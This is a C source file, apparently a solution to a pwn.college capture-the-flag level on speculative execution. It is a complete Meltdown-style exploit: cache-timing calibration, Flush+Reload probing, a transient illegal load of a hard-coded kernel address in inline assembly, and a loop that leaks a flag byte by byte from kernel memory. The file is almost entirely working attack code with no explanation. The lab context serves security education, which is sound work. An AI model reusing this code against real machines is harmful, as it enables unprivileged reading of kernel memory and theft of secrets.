// Microarchitecture Exploitation - Molten Access
// https://pwn.college/system-security/speculative-execution/level13
#define _GNU_SOURCE

#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <x86intrin.h>

#define DEVICE_PATH "/proc/pwncollege"

#define PAGE_SIZE 0x1000UL
#define NUM_PAGES 256
#define ATTEMPTS 100
#define SHMEM_SIZE (NUM_PAGES * PAGE_SIZE)

static volatile unsigned char *shared_mem;
static sigjmp_buf jbuf;
static uint64_t flag_addr = 0xffffffffc0002460;


static inline uint64_t rdtsc_begin(void)
{
    _mm_lfence();
    uint64_t t = __rdtsc();
    _mm_lfence();
    return t;
}

static inline uint64_t rdtsc_end(void)
{
    unsigned aux;
    uint64_t t = __rdtscp(&aux);
    _mm_lfence();
    return t;
}

static inline void clflush(const volatile void *addr)
{
    _mm_clflush((const void *)addr);
    _mm_mfence();
}

static inline uint64_t measure(volatile unsigned char *addr)
{
    uint64_t start = rdtsc_begin();
    (void)*addr;
    return rdtsc_end() - start;
}

static void flush_all(void)
{
    for (unsigned i = 0; i < NUM_PAGES; ++i)
        clflush(shared_mem + (size_t)i * PAGE_SIZE);
}

void sigsegv_handler(int sig)
{
    siglongjmp(jbuf, 1);
}

static void attack(int fd, int target)
{
    if (sigsetjmp(jbuf, 1) != 0)
        return;

    // Prime the L1 cache with the flag data by forcing the kernel to read it
    ioctl(fd, 1337, 0);

    // Meltdown transient instructions
    asm volatile(
        ".intel_syntax noprefix\n"

        // ===== 高延迟：浮点开方 =====
        "mov rax, 0x40000000\n" // 较大的数
        "cvtsi2sd xmm0, rax\n"  // 转成 double
        "sqrtsd xmm0, xmm0\n"   // 开方（很慢）
        "sqrtsd xmm0, xmm0\n"   // 再开一次，进一步拉长延迟
        "cvtsd2si rax, xmm0\n"  // 转回整数（可选，保持依赖）

        // ===== Meltdown transient =====
        "xor rax, rax\n"
        "mov al, byte ptr [%[addr]]\n"        // 非法 load
        "shl rax, 12\n"                       // * 4096
        "mov al, byte ptr [%[probe] + rax]\n" // probe load（必须是 load）

        ".att_syntax prefix\n"
        :
        : [addr] "r"(flag_addr + target),
          [probe] "r"(shared_mem)
        : "rax", "xmm0", "memory");
}

static void probe(unsigned scores[256], uint64_t threshold)
{
    // Exclude value 0 because shared_mem[0] is always accessed by device_ioctl().
    for (unsigned value = 1; value < 0xff; ++value)
    {
        volatile unsigned char *addr =
            shared_mem + (size_t)value * PAGE_SIZE;

        if (measure(addr) <= threshold)
            ++scores[value];
    }
}

static unsigned find_best(const unsigned scores[256])
{
    unsigned best = 1;
    for (unsigned value = 1; value < 0xff; ++value)
    {
        if (scores[value] > scores[best])
            best = value;
    }
    return best;
}

static uint64_t calibrate_threshold(void)
{
    volatile unsigned char *addr =
        shared_mem + 0x80 * PAGE_SIZE;
    (void)*addr;

    uint64_t hit_total = 0;
    uint64_t miss_total = 0;

    for (unsigned i = 0; i < ATTEMPTS; ++i)
    {
        hit_total += measure(addr);
        clflush(addr);
        miss_total += measure(addr);
    }

    uint64_t hit = hit_total / ATTEMPTS;
    uint64_t miss = miss_total / ATTEMPTS;
    uint64_t threshold = (hit * 2 + miss) / 3;
    printf("calibration: hit=%lu miss=%lu threshold=%lu\n",
           hit, miss, threshold);

    return threshold;
}

static unsigned char leak_byte(int fd, int target, uint64_t threshold)
{
    unsigned rounds[256] = {0};

    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (;;)
    {
        unsigned scores[256] = {0};

        for (unsigned i = 0; i < ATTEMPTS; ++i)
        {
            // train step is optional...
            flush_all();
            attack(fd, target);
            probe(scores, threshold);
        }

        unsigned best = find_best(scores);

        // Skip non-printable characters
        if (!(0x20 <= best && best <= 0x7e))
            continue;
        // Skip if no hits
        if (scores[best] < 1)
            continue;

        clock_gettime(CLOCK_MONOTONIC, &t1);
        double elapsed_s = (double)(t1.tv_sec - t0.tv_sec) +
                           (double)(t1.tv_nsec - t0.tv_nsec) / 1e9;

        printf("[%.3fs] target=%-2d best=0x%02x ('%c') score=%u/%u\n",
               elapsed_s, target, best, best,
               scores[best], ATTEMPTS);
        clock_gettime(CLOCK_MONOTONIC, &t0);

        if (++rounds[best] >= 2)
            return best;
    }
}

static int open_device(void)
{
    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0)
        return -1;

    // Allocate shared_mem locally in userspace
    shared_mem = mmap(NULL, SHMEM_SIZE, PROT_READ | PROT_WRITE,
                      MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
    if (shared_mem == MAP_FAILED)
    {
        close(fd);
        return -1;
    }

    return fd;
}

int main(int argc, char *argv[])
{
    unsigned flag_offset = 0;
    if (argc > 1)
        flag_offset = (unsigned)atoi(argv[1]);

    int fd = open_device();
    if (fd < 0)
        return 1;

    signal(SIGSEGV, sigsegv_handler);

    char flag[64] = {0};
    size_t len = 0;
    uint64_t threshold = calibrate_threshold();
    for (unsigned target = flag_offset; target < flag_offset + 64; ++target)
    {
        flag[len++] = leak_byte(fd, target, threshold);
        flag[len] = '\0';
        printf("%s\n", flag);
        if (flag[len - 1] == '}')
            break;
    }

    munmap((void *)shared_mem, SHMEM_SIZE);
    close(fd);
    return 0;
}
